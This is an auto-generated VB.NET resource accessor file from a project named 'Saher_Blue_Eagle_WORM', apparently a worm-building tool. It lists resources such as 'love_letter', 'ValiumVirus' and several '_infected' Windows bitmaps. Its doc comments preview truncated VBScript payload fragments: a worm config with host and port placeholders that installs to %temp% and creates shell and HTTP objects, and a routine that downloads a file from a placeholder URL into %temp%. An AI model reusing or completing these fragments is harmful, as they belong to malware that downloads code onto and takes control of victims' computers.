﻿'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.33440
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("Saher_Blue_Eagle_WORM.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to &apos;=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        '''host = &quot;%HOST%&quot;
        '''port = %PORT%
        '''installdir = &quot;%temp%&quot;
        '''lnkfile = false
        '''lnkfolder = false
        '''&apos;=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=
        '''dim DJB 
        '''dim shellobj 
        '''set shellobj = wscript.createobject(&quot;wscript.shell&quot;)
        '''dim filesystemobj
        '''set filesystemobj = createobject(&quot;scripting.filesystemobject&quot;)
        '''dim httpobj
        '''set httpobj = createobject(&quot;msxml2.xmlhttp&quot;)
        '''&apos;=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=
        '''installname = wscript.scriptname
        '''startup = shellobj.sp [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Config2() As String
            Get
                Return ResourceManager.GetString("Config2", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to .
        '''</summary>
        Friend ReadOnly Property Dl_HELLOVIR() As String
            Get
                Return ResourceManager.GetString("Dl_HELLOVIR", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to On Error Resume Next
        '''Dim sh 
        '''Randomize
        '''Set sh = WScript.CreateObject(&quot;WScript.Shell&quot;)
        '''HTTPDownload &quot;#1&quot;, sh.ExpandEnvironmentStrings(&quot;%temp%&quot; &amp; &quot;\#2.#3&quot;)
        '''Sub HTTPDownload( myURL, myPath )
        '''    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
        '''    Const ForReading = 1, ForWriting = 2, ForAppending = 8
        '''    Set objFSO = CreateObject( &quot;Scripting.FileSystemObject&quot; )
        '''    If objFSO.FolderExists( myPath ) Then
        '''        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, &quot;/&quot; ) + 1 ) )
        '''    ElseIf [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property DW() As String
            Get
                Return ResourceManager.GetString("DW", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to .
        '''</summary>
        Friend ReadOnly Property love_letter() As String
            Get
                Return ResourceManager.GetString("love_letter", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property unknowen() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("unknowen", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property unknowen_infected() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("unknowen_infected", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to .
        '''</summary>
        Friend ReadOnly Property ValiumVirus() As String
            Get
                Return ResourceManager.GetString("ValiumVirus", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property Windows_Vista() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("Windows_Vista", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property Windows_Vista_infected() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("Windows_Vista_infected", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property Windows10() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("Windows10", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property Windows10_infected() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("Windows10_infected", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property Windows7() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("Windows7", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property Windows7_infected() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("Windows7_infected", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property WindowsXP() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("WindowsXP", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property WindowsXP_infected() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("WindowsXP_infected", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
    End Module
End Namespace